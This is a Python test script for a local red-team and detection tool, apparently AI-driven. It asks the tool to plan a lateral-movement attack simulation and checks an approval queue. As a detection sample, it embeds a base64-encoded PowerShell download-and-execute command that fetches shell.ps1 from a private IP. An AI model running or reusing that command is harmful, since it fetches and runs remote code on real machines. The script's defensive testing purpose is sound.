#!/usr/bin/env python3
"""
Test PhantomStrike AI Attack Planning
"""

import requests
import json

def test_phantomstrike_ai():
    """Test PhantomStrike AI attack planning via API"""
    
    print("🎯 Testing PhantomStrike AI Attack Planning")
    print("=" * 50)
    
    # Test 1: Plan attack scenario
    print("\n1. Planning attack scenario...")
    
    try:
        attack_request = {
            "input": "Plan a lateral movement attack simulation targeting Windows endpoints"
        }
        
        response = requests.post(
            "http://localhost:8080/api/soc/invoke",
            json=attack_request,
            headers={'Content-Type': 'application/json'},
            timeout=30
        )
        
        if response.status_code == 200:
            result = response.json()
            print("   ✅ Attack scenario planned successfully")
            print(f"   Response: {result.get('output', 'No output')[:100]}...")
        else:
            print(f"   ❌ Planning failed: {response.status_code}")
            print(f"   Error: {response.text}")
            
    except requests.exceptions.ConnectionError:
        print("   ❌ Cannot connect to server")
        print("   Make sure server is running: python main.py server")
    except Exception as e:
        print(f"   ❌ Error: {e}")
    
    # Test 2: Get pending approvals
    print("\n2. Checking pending approvals...")
    
    try:
        response = requests.get("http://localhost:8080/api/soc/pending-approvals")
        
        if response.status_code == 200:
            approvals = response.json()
            print(f"   ✅ Pending approvals: {len(approvals.get('pending_approvals', []))}")
        else:
            print(f"   ⚠️  Approvals endpoint: {response.status_code}")
            
    except Exception as e:
        print(f"   ⚠️  Approvals check failed: {e}")
    
    # Test 3: Test threat detection
    print("\n3. Testing threat detection...")
    
    try:
        detection_request = {
            "input": "Analyze this suspicious command: powershell.exe -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADAAMAAvAHMAaABlAGwAbAAuAHAAcwAxACIAKQA="
        }
        
        response = requests.post(
            "http://localhost:8080/api/detection/invoke",
            json=detection_request,
            headers={'Content-Type': 'application/json'},
            timeout=30
        )
        
        if response.status_code == 200:
            result = response.json()
            print("   ✅ Threat detection completed")
            print(f"   Response: {result.get('output', 'No output')[:100]}...")
        else:
            print(f"   ⚠️  Detection endpoint: {response.status_code}")
            
    except Exception as e:
        print(f"   ⚠️  Detection test failed: {e}")
    
    print("\n" + "=" * 50)
    print("🎯 PhantomStrike AI Test Complete!")
    print("\n💡 Next steps:")
    print("   1. Use the API endpoints to plan attacks")
    print("   2. Approve scenarios for execution")
    print("   3. Monitor detection results")
    print("   4. Analyze network topology")

if __name__ == "__main__":
    test_phantomstrike_ai()
